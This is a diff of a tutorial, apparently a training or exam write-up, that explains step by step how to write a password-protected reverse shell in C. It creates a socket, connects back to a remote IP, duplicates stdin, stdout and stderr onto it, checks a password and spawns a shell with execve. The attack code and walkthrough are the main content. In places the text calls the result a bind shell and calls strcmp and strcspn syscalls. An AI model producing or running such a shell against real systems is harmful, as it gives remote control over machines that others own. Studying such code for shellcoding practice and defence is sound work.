@@ -79,7 +79,7 @@ sock = socket(AF_INET, SOCK_STREAM, 0);
 
 The return value for the above syscall will be a file descriptor for the new socket.
 
-<h3>Initiate the connection back to remote server</h3>
+<h3>Stage 2 - Initiate the connection back to remote server</h3>
 
 In this step we will construct our 'sockaddr' data structure and actually connect to our remote machine using the [connect](https://man7.org/linux/man-pages/man2/connect.2.html) syscall. Note that in this instance we will be using the localhost IP, but this can be changed to your remote IP Address.
 
@@ -101,15 +101,29 @@ bzero(&server.sin_zero, 8); // 8 zero bytes of padding
 connect(sock, (struct sockaddr *)&server, sockaddr_len);
 ```
 
-<h3>Stage 5 - Map STDIN/STDOUT and STDERROR to the new socket for remote shell capabilities</h3>
+<h3>Stage 3 - Map STDIN/STDOUT and STDERROR to the new socket for remote shell capabilities</h3>
 
-For this stage we will be duplicating the file descriptor of our newly created socket and provide it with the basic shell capabilities. The dup2 syscall will do nicely for this purpose. We need to provide the file descriptor of our newly created socket and the integer assigned to STDIN (0), STDOUT (1) and STDERROR(2) to dup2.
+For this stage we will be duplicating the file descriptor of our newly created socket and provide it with the basic shell capabilities. The [dup2](https://man7.org/linux/man-pages/man2/dup.2.html) syscall will do nicely for this purpose. We need to provide the file descriptor of our newly created socket and the integer assigned to STDIN (0), STDOUT (1) and STDERROR(2) to dup2.
 
 ```c
 dup2(sock, 0);
 dup2(sock, 1);
 dup2(sock, 2);
 ```
+
+<h3>Stage 4 - Wait for input (password) to be received and compare it against the correct password string</h3>
+
+Now that we have remote shell capabilities on our socket, let's wait for input (password) from the connection and compare it to the password that we have in memory. We will wait for and read input with the [read](https://man7.org/linux/man-pages/man2/read.2.html) syscall.
+
+The read syscall accepts 3 arguments:
+
+<ul>
+<li>File descriptor of our newly created socket</li>
+<li>Buffer - was assigned at the variables section of the code</li>
+<li>Number of bytes to read from the file descriptor into the buffer</li>
+</ul>
+
+We will then use the [strcspn](https://man7.org/linux/man-pages/man3/strcspn.3.html) syscall to calculate the number of bytes in the buffer and using the [strcmp](https://man7.org/linux/man-pages/man3/strcmp.3.html) syscall to compare the string in the buffer with our hardcoded password in memory. If the two strings match, the strcmp syscall will return a 0, and our program will continue. If the two strings don't match, our program/shell will exit.
 
 ```c
 read(sock, buf, 16);
@@ -120,6 +134,24 @@ if (strcmp(arguments[4], buf) == 0)
 }
        
 ```
+
+<h3>Stage 5 - Spawn the shell, if password is correct</h3>
+
+So, if we have provided the correct password, our program/shell will continue and actually spawn our shell using the [execve](https://man7.org/linux/man-pages/man2/execve.2.html) syscall with the arguments that were configured in the variables section.
+
+The execve syscall executes a program using:
+
+<ul>
+  <li>Pathname of the executable or script to run</li>
+  <li>A pointer to the filename/executable and arguments passed to the executable. We do not have any arguments in this case, so just the pointer to our executable</li>
+  <li>Environmental variables for use by the program - We set this to NULL as we are not concerned with this</li>
+</ul>
+
+All we need to do now is compile the C code into an elf binary and execute it. Hopefully, if we have done everything right, we will be presented with a shell upon connection back to our remote IP.
+
+The code for the password protected bind shell can be found [here](https://github.com/J33R4FF3/Pass_Rev_Shell).
+
+
 
 ```nasm
 global _start
